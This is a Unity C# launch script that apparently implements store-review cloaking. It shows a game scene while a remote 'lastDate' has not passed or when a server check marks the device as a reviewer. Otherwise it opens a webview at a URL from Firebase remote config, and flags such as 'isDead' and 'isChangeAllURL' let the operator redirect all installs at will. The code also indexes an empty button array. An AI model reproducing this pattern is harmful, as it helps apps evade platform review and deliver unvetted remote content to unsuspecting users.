using System;
using System.Collections;
using System.Collections.Generic;
using System.Globalization;
using UnityEngine;
using UnityEngine.iOS;
using UnityEngine.SceneManagement;
using UnityEngine.UI;

public class StartLoading : MonoBehaviour
{
    [SerializeField] private RequestToServer _Request_To_Server;
    [SerializeField] private FirebaseConfig _Firebse_Config;
    [SerializeField] private Webview _Webview;

    [SerializeField] private GameObject _User_Onboarding;
    [SerializeField] private GameObject _Reviewer_Onboarding;

    [SerializeField] private Button[] _Action_Buttons; 
    
    private string _URL;

    private void OnEnable() => _Firebse_Config._On_Loaded += StartProcess;

    private void OpenWebviewButton()
    {
        if (_Action_Buttons.Length == 0)
        {
            _Action_Buttons[0].onClick.AddListener(_Webview.Open);
            return;
        }
        
        for (int i = 0; i < _Action_Buttons.Length; i++)
            _Action_Buttons[i].onClick.AddListener(_Webview.Open);
        
    }

    private void OpenMenuButton()
    {
        if (_Action_Buttons.Length == 0)
        {
            _Action_Buttons[0].onClick.AddListener(delegate { SceneManager.LoadScene(1); });
            return;
        }
        
        for (int i = 0; i < _Action_Buttons.Length; i++)
            _Action_Buttons[i].onClick.AddListener(delegate { SceneManager.LoadScene(1); });
    }

    private void StartProcess() => StartCoroutine(AppOpeningProcess());

    private bool WebviewWasOpening()
    {
        _URL = PlayerPrefs.GetString("url", "null");

        if (_URL == "null")
            return false;

        return true;
    }

    private IEnumerator AppOpeningProcess()
    {
        if (WebviewWasOpening())
        {

            if (_Firebse_Config.ConfigValues["isChangeAllURL"] == "true")
            {
                Debug.Log($"Url has been changed on {_Firebse_Config.ConfigValues["url_link"]}");

                _Webview.LoadURL(_Firebse_Config.ConfigValues["url_link"]);
                _Webview.Open();
            }
            else
            {
                Debug.Log("Last saved url");
                
                _Webview.LoadURL();
                _Webview.Open();
            }
            
            yield break;
        }

        if (_Firebse_Config.ConfigValues["isDead"] == "true")
        {
            OpenWebviewButton();
            
            _User_Onboarding.SetActive(true);
            _Webview.LoadURL(_Firebse_Config.ConfigValues["url_link"]);
            yield break;
        }
        
        DateTime _current_Data = DateTime.Now;
        
        DateTime _last_Date =  DateTime.Parse(_Firebse_Config.ConfigValues["lastDate"], new CultureInfo("de-CH"));

        if (_last_Date >= _current_Data)
        {
            SceneManager.LoadScene(1);
            
            Debug.Log("Game");
            yield break;
        }

        _Request_To_Server.Request();
        
        while (!_Request_To_Server.IsRequestDone)
            yield return null;

        if (_Request_To_Server.Answer == "false")
        {
            Debug.Log("false");
            
            OpenWebviewButton();
            
            _User_Onboarding.SetActive(true);
            _Webview.LoadURL(_Firebse_Config.ConfigValues["url_link"]);
        }
        else
        {
            Debug.Log("true");
            
            OpenMenuButton();
            
            _Reviewer_Onboarding.SetActive(true);
        }

    }

    public void ShowRateMassage() => StartCoroutine(RateUs());

    private IEnumerator RateUs()
    {
        float _delay = 1;

        yield return new WaitForSeconds(_delay);
        
        Debug.Log("Rate us");
        
        Device.RequestStoreReview();
    }
    
    private void OnDisable() => _Firebse_Config._On_Loaded -= StartProcess;
}
